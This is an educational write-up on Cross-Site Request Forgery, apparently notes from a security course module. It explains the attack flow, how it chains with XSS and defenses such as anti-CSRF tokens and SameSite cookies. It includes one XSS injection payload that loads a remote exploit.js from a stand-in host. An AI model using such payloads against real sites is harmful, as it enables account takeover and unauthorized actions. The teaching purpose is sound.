# Cross-Site Request Forgery (CSRF)

## 🎯 Objective

Understand what **Cross-Site Request Forgery (CSRF)** is, how attackers abuse a victim's authenticated session to perform unauthorized actions, and the common defenses used to prevent CSRF attacks.

---

# Overview

Cross-Site Request Forgery (CSRF) is a web attack that tricks an authenticated user into performing unwanted actions on a web application.

Unlike XSS, where malicious JavaScript executes inside the vulnerable application, **CSRF abuses the victim's existing authenticated session** to send legitimate requests without their knowledge.

If the victim is already logged in, the browser automatically includes session cookies, allowing the malicious request to execute with the victim's privileges.

---

# How CSRF Works

A typical CSRF attack follows these steps:

1. The victim logs into a web application.
2. The application creates an authenticated session cookie.
3. The attacker sends the victim a malicious link or webpage.
4. The victim visits the malicious page while still logged in.
5. The browser automatically includes the victim's session cookie.
6. The target application processes the request as if it came from the legitimate user.

The attacker never needs to know the victim's password.

---

# Example Attack

A common CSRF attack targets password changes.

Instead of stealing the user's credentials, the attacker forces the application to change the victim's password to one chosen by the attacker.

Attack flow:

```
Victim logs into website
          │
          ▼
Victim visits malicious webpage
          │
          ▼
Malicious JavaScript sends
Password Change Request
          │
          ▼
Browser automatically includes
authenticated session cookie
          │
          ▼
Website changes victim's password
          │
          ▼
Attacker logs in using the new password
```

---

# Loading a Malicious Script

The module demonstrates loading an external JavaScript file:

```html
"><script src=//www.example.com/exploit.js></script>
```

The external file (`exploit.js`) contains JavaScript that automatically performs actions on behalf of the authenticated user.

For example, it could:

- Change the user's password
- Modify account settings
- Add a new administrator
- Transfer money
- Delete data

The exact payload depends on how the target application performs those actions.

---

# Relationship Between XSS and CSRF

CSRF attacks often become much more powerful when combined with XSS.

### XSS

Allows attackers to execute JavaScript inside the victim's browser.

### CSRF

Uses the victim's authenticated session to perform unauthorized requests.

When combined:

```
XSS
      │
      ▼
Execute malicious JavaScript
      │
      ▼
Automatically send authenticated requests
      │
      ▼
Victim performs attacker-controlled actions
```

---

# Prevention

Developers should implement multiple layers of protection.

## Input Sanitization

Remove dangerous characters before displaying or storing user input.

Example:

- Strip HTML tags
- Escape special characters

---

## Input Validation

Accept only properly formatted input.

Examples:

- Email format
- Phone number format
- Username restrictions

---

## Output Encoding

Escape user-controlled data before rendering it in the browser to prevent injected HTML or JavaScript from executing.

---

## Anti-CSRF Tokens

Most modern applications generate a unique token for every user session or request.

Example:

```
<form>
    <input type="hidden" name="csrf_token" value="a8f74bc...">
</form>
```

When the form is submitted, the server verifies that the token is valid before processing the request.

---

## SameSite Cookies

Modern browsers support the `SameSite` cookie attribute.

Example:

```
SameSite=Strict
```

or

```
SameSite=Lax
```

This prevents browsers from automatically sending authentication cookies during many cross-site requests.

---

## Re-authentication

Require users to enter their password before performing sensitive operations such as:

- Changing passwords
- Updating email addresses
- Deleting accounts
- Performing financial transactions

---

## Web Application Firewall (WAF)

A WAF can detect and block many injection attempts.

However, it should be treated as an additional security layer rather than the primary defense, since attackers may find ways to bypass WAF protections.

---

# Security Best Practices

Developers should:

- Sanitize user input
- Validate all incoming data
- Encode output before rendering
- Use anti-CSRF tokens
- Configure SameSite cookies
- Require re-authentication for critical actions
- Follow secure coding practices instead of relying solely on security appliances

---

# Key Takeaways

- CSRF tricks authenticated users into performing unintended actions.
- Browsers automatically include session cookies, making CSRF possible.
- XSS and CSRF are often chained together for more powerful attacks.
- Anti-CSRF tokens are one of the most effective defenses.
- SameSite cookies provide additional protection against cross-site requests.
- Secure coding practices remain the strongest defense against CSRF.
